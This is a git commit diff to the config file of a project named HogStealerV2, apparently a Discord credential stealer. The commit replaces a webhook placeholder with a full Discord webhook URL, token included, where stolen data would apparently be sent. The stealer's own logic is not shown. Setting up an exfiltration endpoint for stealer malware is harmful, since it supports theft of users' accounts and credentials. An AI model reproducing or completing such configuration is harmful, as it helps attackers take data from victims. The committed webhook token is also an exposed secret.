26ea7b78b3eb578b52861c09a9802228d088e141
ttrdff <73395404+ttrdff@users.noreply.github.com>
2020-11-11 20:36:57 +0100

    Update Config.cs

--- HogStealerV2/Config.cs
+++ HogStealerV2/Config.cs
@@ -2,7 +2,7 @@
 {
     public static class Config
     {
-        public static string HookURL = @"YOUR-WEBHOOK-HERE"; // the fucking
+        public static string HookURL = @"https://discordapp.com/api/webhooks/776166809689653288/-gaTnI8-JzLaiRigp8De1OGYWOZ5ah1zmCVD7LiWWT9C06_2_Ygc7Hdxm4m3uba4llsG"; // the fucking
         public static bool RestartDiscord = false;
     }
 }
